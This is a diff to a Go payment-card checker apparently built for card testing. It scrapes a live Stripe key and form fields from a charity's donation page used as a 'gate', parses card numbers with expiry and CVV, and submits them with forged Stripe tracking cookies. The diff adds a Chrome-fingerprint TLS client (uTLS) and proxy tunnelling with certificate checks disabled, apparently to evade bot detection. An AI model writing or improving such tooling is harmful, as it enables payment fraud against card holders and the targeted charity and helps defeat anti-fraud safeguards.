@@ -1,18 +1,24 @@
 package stripe
 
 import (
+	"context"
 	"crypto/md5"
 	"crypto/rand"
-	"crypto/tls"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
+	"net"
 	"net/http"
 	"net/http/cookiejar"
 	"net/url"
 	"regexp"
 	"strings"
+	"sync"
 	"time"
+
+	utls "github.com/refraction-networking/utls"
+	"golang.org/x/net/http2"
 )
 
 // ─── Types ────────────────────────────────────────────────────────────────────
@@ -64,21 +70,219 @@ func parseCard(cc string) (num, mm, yy, cvv string, ok bool) {
 	return
 }
 
+// ─── HTTP Client with uTLS (Chrome 120 fingerprint + HTTP/2 support) ─────────
+
+type cachedConn struct {
+	h2  *http2.ClientConn
+	tls *utls.UConn
+	raw net.Conn
+}
+
+type utlsTransport struct {
+	spec    *utls.ClientHelloID
+	proxy   func(*http.Request) (*url.URL, error)
+	timeout time.Duration
+
+	mu    sync.Mutex
+	conns map[string]*cachedConn
+
+	plainOnce sync.Once
+	plainTr   *http.Transport
+}
+
+func (t *utlsTransport) getPlainTransport() *http.Transport {
+	t.plainOnce.Do(func() {
+		t.plainTr = &http.Transport{Proxy: t.proxy}
+	})
+	return t.plainTr
+}
+
+func (t *utlsTransport) dial(ctx context.Context, req *http.Request, host, addr string) (*utls.UConn, net.Conn, error) {
+	var rawConn net.Conn
+	var err error
+
+	if t.proxy != nil {
+		proxyURL, pErr := t.proxy(req)
+		if pErr == nil && proxyURL != nil {
+			rawConn, err = dialThroughProxy(ctx, proxyURL, addr)
+		} else {
+			rawConn, err = (&net.Dialer{}).DialContext(ctx, "tcp", addr)
+		}
+	} else {
+		rawConn, err = (&net.Dialer{}).DialContext(ctx, "tcp", addr)
+	}
+	if err != nil {
+		return nil, nil, fmt.Errorf("dial %s: %w", addr, err)
+	}
+
+	tlsConn := utls.UClient(rawConn, &utls.Config{
+		ServerName:         host,
+		InsecureSkipVerify: true,
+	}, *t.spec)
+
+	if err := tlsConn.HandshakeContext(ctx); err != nil {
+		rawConn.Close()
+		return nil, nil, fmt.Errorf("tls handshake %s: %w", host, err)
+	}
+
+	return tlsConn, rawConn, nil
+}
+
+func dialThroughProxy(ctx context.Context, proxyURL *url.URL, target string) (net.Conn, error) {
+	proxyAddr := proxyURL.Host
+	if !strings.Contains(proxyAddr, ":") {
+		proxyAddr = net.JoinHostPort(proxyAddr, "80")
+	}
+
+	conn, err := (&net.Dialer{}).DialContext(ctx, "tcp", proxyAddr)
+	if err != nil {
+		return nil, fmt.Errorf("proxy dial: %w", err)
+	}
+
+	connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n", target, target)
+	if proxyURL.User != nil {
+		user := proxyURL.User.Username()
+		pass, _ := proxyURL.User.Password()
+		auth := base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
+		connectReq += "Proxy-Authorization: Basic " + auth + "\r\n"
+	}
+	connectReq += "\r\n"
+
+	if _, err := conn.Write([]byte(connectReq)); err != nil {
+		conn.Close()
+		return nil, err
+	}
+
+	buf := make([]byte, 4096)
+	n, err := conn.Read(buf)
+	if err != nil {
+		conn.Close()
+		return nil, err
+	}
+	resp := string(buf[:n])
+	if len(resp) < 12 || resp[9] != '2' {
+		conn.Close()
+		return nil, fmt.Errorf("proxy CONNECT failed: %s", resp[:min(len(resp), 80)])
+	}
+
+	return conn, nil
+}
+
+func (t *utlsTransport) RoundTrip(req *http.Request) (*http.Response, error) {
+	if req.URL.Scheme != "https" {
+		return t.getPlainTransport().RoundTrip(req)
+	}
+
+	host := req.URL.Hostname()
+	port := req.URL.Port()
+	if port == "" {
+		port = "443"
+	}
+	addr := net.JoinHostPort(host, port)
+
+	ctx := req.Context()
+	if t.timeout > 0 {
+		var cancel context.CancelFunc
+		ctx, cancel = context.WithTimeout(ctx, t.timeout)
+		defer cancel()
+	}
+
+	t.mu.Lock()
+	if t.conns == nil {
+		t.conns = make(map[string]*cachedConn)
+	}
+	cc := t.conns[addr]
+	t.mu.Unlock()
+
+	if cc != nil && cc.h2 != nil {
+		if cc.h2.CanTakeNewRequest() {
+			resp, err := cc.h2.RoundTrip(req)
+			if err == nil {
+				return resp, nil
+			}
+			t.mu.Lock()
+			if t.conns[addr] == cc {
+				delete(t.conns, addr)
+			}
+			t.mu.Unlock()
+			cc.tls.Close()
+		} else {
+			t.mu.Lock()
+			if t.conns[addr] == cc {
+				delete(t.conns, addr)
+			}
+			t.mu.Unlock()
+		}
+	}
+
+	tlsConn, rawConn, err := t.dial(ctx, req, host, addr)
+	if err != nil {
+		return nil, err
+	}
+
+	alpn := tlsConn.ConnectionState().NegotiatedProtocol
+
+	if alpn == "h2" {
+		h2Transport := &http2.Transport{
+			DisableCompression: false,
+			AllowHTTP:          false,
+		}
+		h2cc, err := h2Transport.NewClientConn(tlsConn)
+		if err != nil {
+			tlsConn.Close()
+			return nil, fmt.Errorf("h2 client conn: %w", err)
+		}
+
+		entry := &cachedConn{h2: h2cc, tls: tlsConn, raw: rawConn}
+		t.mu.Lock()
+		t.conns[addr] = entry
+		t.mu.Unlock()
+
+		resp, err := h2cc.RoundTrip(req)
+		if err != nil {
+			t.mu.Lock()
+			if t.conns[addr] == entry {
+				delete(t.conns, addr)
+			}
+			t.mu.Unlock()
+			tlsConn.Close()
+			return nil, err
+		}
+		return resp, nil
+	}
+
+	connTransport := &http.Transport{
+		DialTLSContext: func(_ context.Context, _, _ string) (net.Conn, error) {
+			return tlsConn, nil
+		},
+		DisableKeepAlives: true,
+	}
+
+	resp, err := connTransport.RoundTrip(req)
+	if err != nil {
+		tlsConn.Close()
+		return nil, err
+	}
+	return resp, nil
+}
+
 func buildClient(proxyURL string, timeout time.Duration) *http.Client {
 	jar, _ := cookiejar.New(nil)
-	tr := &http.Transport{
-		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-	}
+	var proxyFunc func(*http.Request) (*url.URL, error)
 	if proxyURL != "" {
 		proxyURL = normaliseProxy(proxyURL)
 		if parsed, err := url.Parse(proxyURL); err == nil {
-			tr.Proxy = http.ProxyURL(parsed)
+			proxyFunc = http.ProxyURL(parsed)
 		}
 	}
 	return &http.Client{
-		Timeout:   timeout,
-		Transport: tr,
-		Jar:       jar,
+		Timeout: timeout,
+		Jar:     jar,
+		Transport: &utlsTransport{
+			spec:    &utls.HelloChrome_120,
+			proxy:   proxyFunc,
+			timeout: timeout,
+		},
 	}
 }
 
@@ -146,7 +350,11 @@ func CheckStripe(req StripeRequest) StripeResult {
 
 	pkLive := regexp.MustCompile(`pk_live_[a-zA-Z0-9]+`).FindString(html)
 	if pkLive == "" {
-		return errResult(req, "error", "pk_live not found on gate page", "", start)
+		snippet := html
+		if len(snippet) > 200 {
+			snippet = snippet[:200]
+		}
+		return errResult(req, "error", "pk_live not found on gate page: "+snippet, "", start)
 	}
 
 	seedMatch := regexp.MustCompile(`name=["']happyforms_random_seed["']\s+value=["'](\d+)["']`).FindStringSubmatch(html)
@@ -248,18 +456,24 @@ func CheckStripe(req StripeRequest) StripeResult {
 	formData.Set("platform_info[outer_height]", "1080")
 	formData.Set("platform_info[connectionRtt]", "100")
 
-	// Set cookies on client.Jar (preserving session cookies from Step 1)
-	u, _ := url.Parse("https://belovedcommunity.org/")
+	// Set cookies preserving session cookies from Step 1 with raw double quotes
+	u, _ := url.Parse(gateURL)
+	var existingCookies []string
+	if client.Jar != nil {
+		for _, c := range client.Jar.Cookies(u) {
+			existingCookies = append(existingCookies, c.Name+"="+c.Value)
+		}
+	}
 	stripeMID := generateUUID()
 	stripeSID := generateUUID()
 	pmCookie := fmt.Sprintf(`{"payment_method":"%s"}`, pmID)
 
-	cookies := []*http.Cookie{
-		{Name: "__stripe_mid", Value: stripeMID, Domain: "belovedcommunity.org", Path: "/"},
-		{Name: "__stripe_sid", Value: stripeSID, Domain: "belovedcommunity.org", Path: "/"},
-		{Name: fmt.Sprintf("happyforms_%s_stripe_checkout", formID), Value: pmCookie, Domain: "belovedcommunity.org", Path: "/"},
-	}
-	client.Jar.SetCookies(u, cookies)
+	existingCookies = append(existingCookies,
+		"__stripe_mid="+stripeMID,
+		"__stripe_sid="+stripeSID,
+		fmt.Sprintf("happyforms_%s_stripe_checkout=%s", formID, pmCookie),
+	)
+	cookieHeader := strings.Join(existingCookies, "; ")
 
 	formHeaders := map[string]string{
 		"Content-Type":     "application/x-www-form-urlencoded; charset=UTF-8",
@@ -267,6 +481,7 @@ func CheckStripe(req StripeRequest) StripeResult {
 		"Referer":          gateURL,
 		"User-Agent":       ua,
 		"X-Requested-With": "XMLHttpRequest",
+		"Cookie":           cookieHeader,
 	}
 
 	formBody, err := doPOST(client, gateURL, formData.Encode(), formHeaders)
